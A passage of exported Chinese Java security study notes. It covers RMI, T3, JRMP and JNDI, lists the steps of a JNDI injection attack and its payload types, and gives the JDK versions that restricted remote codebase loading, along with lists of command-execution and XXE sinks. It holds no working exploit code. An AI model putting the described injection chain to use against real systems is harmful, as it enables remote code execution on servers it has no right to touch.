class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>13</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">public</span> <span class="cm-keyword">class</span> <span class="cm-def">PersonClient</span>{</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">public</span> <span class="cm-keyword">static</span> <span class="cm-variable-3">void</span> <span class="cm-variable">main</span>(<span class="cm-variable-3">String</span>[] <span class="cm-variable">args</span>){ </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">try</span>{ </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">Person</span> <span class="cm-variable">person</span><span class="cm-operator">=</span><span class="cm-keyword">new</span> <span class="cm-variable">Person_Stub</span>(); </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-3">int</span> <span class="cm-variable">age</span><span class="cm-operator">=</span><span class="cm-variable">person</span>.<span class="cm-variable">getAge</span>(); </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-3">String</span> <span class="cm-variable">name</span><span class="cm-operator">=</span><span class="cm-variable">person</span>.<span class="cm-variable">getName</span>(); </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">System</span>.<span class="cm-variable">out</span>.<span class="cm-variable">println</span>(<span class="cm-variable">name</span><span class="cm-operator">+</span><span class="cm-string">"is"</span><span class="cm-operator">+</span><span class="cm-variable">age</span><span class="cm-operator">+</span><span class="cm-string">"yearsold"</span>); </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">catch</span>(<span class="cm-variable">Throwable</span> <span class="cm-variable">t</span>){</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">t</span>.<span class="cm-variable">printStackTrace</span>();</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 295px;"></div><div class="CodeMirror-gutters" style="height: 295px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre><h4 id='t3-协议'><span>T3 协议</span></h4><p><span>T3 协议是用于在 WebLogic 服务器和其他类型的 Java 程序之间传输信息的协议，是 Weblogic 对 RMI 规范的实现。简单来说，可以把 T3 视为暴露 JDNI 给用户调用的接口。</span></p><h4 id='jrmp'><span>JRMP</span></h4><blockquote><p><span>Java 远程方法协议 (Java Remote Method Protocol，JRMP) 是特定于 Java 技术的、用于查找和引用远程对象的协议。这是运行在 Java 远程方法调用 (RMI) 之下、TCP/IP 之上的线路层协议。</span></p><p><span>JRMP 是一个 Java 特有的、适用于 Java 之间远程调用的基于流的协议，要求客户端和服务器上都使用 Java对象。</span></p></blockquote><h3 id='jndi-1'><span>JNDI</span></h3><h4 id='简介-27'><span>简介</span></h4><blockquote><p><span>JNDI(Java Naming and Directory Interface，Java 命名和目录接口) 是为 Java 应用程序提供命名和目录访问服务的 API，允许客户端通过名称发现和查找数据、对象，用于提供基于配置的动态调用。这些对象可以存储在不同的命名或目录服务中，例如 RMI、CORBA、LDAP、DNS 等。</span></p><p><span>其中 Naming Service 类似于哈希表的 K/V 对，通过名称去获取对应的服务。Directory Service 是一种特殊的 Naming Service，用类似目录的方式来存取服务。</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220508121830593.png" referrerpolicy="no-referrer" alt="image-20220508121830593"></p></blockquote><h4 id='jndi-注入'><span>JNDI 注入</span></h4><p><span>JNDI 注入是 2016 年由 pentester 在 BlackHat USA 上的 A Journey From JNDI LDAP Manipulation To RCE 议题提出的。</span></p><blockquote><p><span>其攻击过程如下</span></p></blockquote><ol start='' ><li><span>攻击者将 Payload 绑定到攻击者的命名/目录服务中</span></li><li><span>攻击者将绝对 URL 注入易受攻击的 JNDI 查找方法</span></li><li><span>应用程序执行查找</span></li><li><span>应用程序连接到攻击者控制的 JNDI 服务并返回 Payload</span></li><li><span>应用程序解码响应并触发有效负载</span></li></ol><h4 id='攻击载荷'><span>攻击载荷</span></h4><blockquote><p><span>JDNI 主要有几种攻击载荷：</span></p></blockquote><ul><li><span>CORBA</span></li><li><span>IOR</span></li><li><span>JNDI Reference</span></li><li><span>LDAP</span></li><li><span>Remote Location</span></li><li><span>Remote Object</span></li><li><span>RMI</span></li><li><span>Serialized Object</span></li></ul><h4 id='rmi-remote-object'><span>RMI Remote Object</span></h4><blockquote><p><span>攻击者实现一个 RMI 恶意远程对象并绑定到 RMI Registry 上，将编译后的 RMI 远程对象类放在 HTTP/FTP/SMB 等服务器上。其中 Codebase 地址由远程服务器的 java.rmi.server.codebase 属性设置，供受害者的 RMI 客户端远程加载。</span></p><p><span>利用条件如下：</span></p></blockquote><ul><li><span>RMI 客户端的上下文环境允许访问远程 Codebase。</span></li><li><span>属性 java.rmi.server.useCodebaseOnly 的值为 false。</span></li></ul><p><span>其中 JDK 6u45、7u21 后，java.rmi.server.useCodebaseOnly 的值默认为 true。</span></p><h4 id='rmi--jndi-reference'><span>RMI + JNDI Reference</span></h4><blockquote><p><span>攻击者通过 RMI 服务返回一个 JNDI Naming Reference，受害者解码 Reference 时会去攻击者指定的远程地址加载 Factory 类。这种方式原理上并非使用 RMI Class Loading 机制，因此不受 java.rmi. server.useCodebaseOnly 系统属性的限制。但是在 JDK 6u132, JDK 7u122, JDK 8u113 后限制了 Nam- ing/Directory 服务中 JNDI Reference 远程加载 Object Factory 类的特性。系统属性 com.sun.jndi.rmi. object.trustURLCodebase 、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为 false，即默认不允许从远程的 Codebase 加载 Reference 工厂类。</span></p></blockquote><h4 id='ldap--jndi-reference'><span>LDAP + JNDI Reference</span></h4><blockquote><p><span>Java 的 LDAP 可以在属性值中存储特定的 Java 对象， LDAP 服务的 Reference 远程加载 Factory 类不受 com.sun.jndi.rmi.object.trustURLCodebase 、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，适用范围更广。</span></p></blockquote><h3 id='jdk-2'><span>JDK</span></h3><h4 id='jdk-6'><span>JDK 6 </span></h4><h5 id='6u45'><span>6u45</span></h5><ul><li><span>java.rmi.server.useCodebaseOnly 默认为 true，禁用自动加载远程类文件</span></li></ul><h5 id='6u141'><span>6u141</span></h5><ul><li><span>com.sun.jndi.rmi.object.trustURLCodebase 默认为 false</span></li><li><span>com.sun.jndi.cosnaming.object.trustURLCodebase 默认为 false</span></li></ul><h5 id='6u211'><span>6u211</span></h5><ul><li><span>LDAP 远程 Reference 代码默认不信任，影响 LDAP 远程 Reference 代码攻击方式</span></li></ul><h4 id='jdk-7'><span>JDK 7 </span></h4><h5 id='7u40'><span>7u40</span></h5><ul><li><span>java.io.File 类中添加了 isInvalid 方法，检测文件名中是否包含空字节</span></li></ul><h4 id='7u122'><span>7u122</span></h4><ul><li><span>com.sun.jndi.rmi.object.trustURLCodebase 默认为 false</span></li><li><span>com.sun.jndi.cosnaming.object.trustURLCodebase 默认为 false</span></li></ul><h5 id='7u201'><span>7u201</span></h5><ul><li><span>LDAP 远程 Reference 代码默认不信任，影响 LDAP 远程 Reference 代码攻击方式</span></li></ul><h4 id='jdk-8'><span>JDK 8</span></h4><ul><li><span>sun.net.www.protocol 不再支持 gopher 协议</span></li></ul><h5 id='8u113'><span>8u113</span></h5><ul><li><span>com.sun.jndi.rmi.object.trustURLCodebase 默认为 false</span></li><li><span>com.sun.jndi.cosnaming.object.trustURLCodebase 默认为 false</span></li></ul><h5 id='8u121'><span>8u121</span></h5><ul><li><span>RMI 加入了反序列化白名单机制</span></li><li><span>RMI 远程 Reference 代码默认不信任，影响 RMI 远程 Reference 代码攻击方式</span></li></ul><h5 id='8u191'><span>8u191</span></h5><ul><li><span>LDAP 远程 Reference 代码默认不信任，影响 LDAP 远程 Reference 代码攻击方式</span></li></ul><h5 id='8u251'><span>8u251</span></h5><ul><li><span>com.sun.org.apache.bcel.internal.util.ClassLoader 类被删除</span></li></ul><h3 id='常见-sink-1'><span>常见 Sink</span></h3><h4 id='命令执行注入'><span>命令执行/注入</span></h4><ul><li><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="java"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="java"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>3</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">java</span>.<span class="cm-variable">lang</span>.<span class="cm-variable">Runtime</span>.<span class="cm-variable">getRuntime</span>().<span class="cm-variable">exec</span>()</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">java</span>.<span class="cm-variable">lang</span>.<span class="cm-variable">ProcessBuilder</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="height: 68px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre></li></ul><h4 id='xxe-2'><span>XXE</span></h4><ul><li><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="java" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="java"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>35</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">java</span>.<span class="cm-variable">net</span>.<span class="cm-variable">bull</span>.<span class="cm-variable">javamelody</span>.<span class="cm-variable">PayloadNameRequestWrapper</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">javax</span>.<span class="cm-variable">xml</span>.<span class="cm-variable">bind</span>.<span class="cm-variable">Unmarshaller</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">javax</span>.<span class="cm-variable">xml</span>.<span class="cm-variable">parsers</span>.<span class="cm-variable">DocumentBuilderFactory</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">javax</span>.<span class="cm-variable">xml</span>.<span class="cm-variable">parsers</span>.<span class="cm-variable">SAXParser</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">javax</span>.<span class="cm-variable">xml</span>.<span class="cm-variable">stream</span>.<span class="cm-variable">XMLStreamReader</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">javax</span>.<span class="cm-variable">xml</span>.<span class="cm-variable">transform</span>.<span class="cm-variable">sax</span>.<span class="cm-variable">SAXSource</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">javax</span>.<span class="cm-variable">xml</span>.<span class="cm-variable">transform</span>.<span class="cm-variable">sax</span>.<span class="cm-variable">SAXTransformerFactory</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">15</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">javax</span>.<span class="cm-variable">xml</span>.<span class="cm-variable">transform</span>.<span class="cm-variable">TransformerFactory</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">16</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">17</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">javax</span>.<span class="cm-variable">xml</span>.<span class="cm-variable">validation</span>.<span class="cm-variable">SchemaFactory</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">18</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">19</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">javax</span>.<span class="cm-variable">xml</span>.<span class="cm-variable">validation</span>.<span class="cm-variable">Validator</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">20</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">21</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">javax</span>.<span class="cm-variable">xml</span>.<span class="cm-variable">xpath</span>.<span class="cm-variable">XpathExpression</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">22</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">23</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">org</span>.<span class="cm-variable">apache</span>.<span class="cm-variable">commons</span>.<span class="cm-variable">digester3</span>.<span class="cm-variable">Digester</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">24</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">25</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">org</span>.<span class="cm-variable">apache</span>.<span class="cm-variable">ofbiz</span>.<span class="cm-variable">base</span>.<span class="cm-variable">util</span>.<span class="cm-variable">UtilXml</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">26</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">27</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">org</span>.<span class="cm-variable">dom4j</span>.<span class="cm-variable">io</span>.<span class="cm-variable">SAXReader</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">28</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">29</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">org</span>.<span class="cm-variable">jdom</span>.<span class="cm-variable">input</span>.<span class="cm-variable">SAXBuilder</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">30</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">31</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">org</span>.<span class="cm-variable">jdom2</span>.<span class="cm-variable">input</span>.<span class="cm-variable">SAXBuilder</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">32</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">33</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">-</span> &nbsp; <span class="cm-variable">org</span>.<span class="cm-variable">xml</span>.<span class="cm-variable">sax</span>.<span class="cm-variable">helpers</span>.<span class="cm-variable">XMLReaderFactory</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">34</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
